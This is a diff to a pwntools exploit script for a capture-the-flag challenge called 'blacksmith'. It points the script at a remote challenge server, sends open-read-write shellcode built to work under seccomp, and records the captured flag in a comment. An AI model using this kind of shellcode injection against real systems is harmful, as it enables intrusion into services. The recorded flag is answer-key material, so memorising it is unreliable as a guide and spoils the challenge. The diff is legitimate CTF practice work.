@@ -40,7 +40,9 @@ from pwn import *
 context.arch = 'amd64'
 context.log_level = 'debug'
 
-io = process('./blacksmith')
+#io = process('./blacksmith')
+ip, port = '165.227.237.190', 30509
+io = remote(ip, port)
 
 io.sendlineafter('>', '1')
 io.sendlineafter('>', '2')
@@ -50,4 +52,5 @@ shellcode += asm(shellcraft.read(3, 'rsp', 64))
 shellcode += asm(shellcraft.write(1, 'rsp', 64))
 
 io.sendlineafter('>', shellcode)
-io.interactive()
+print(io.recvall())
+#HTB{s3cc0mp_1s_t00_s3cur3}
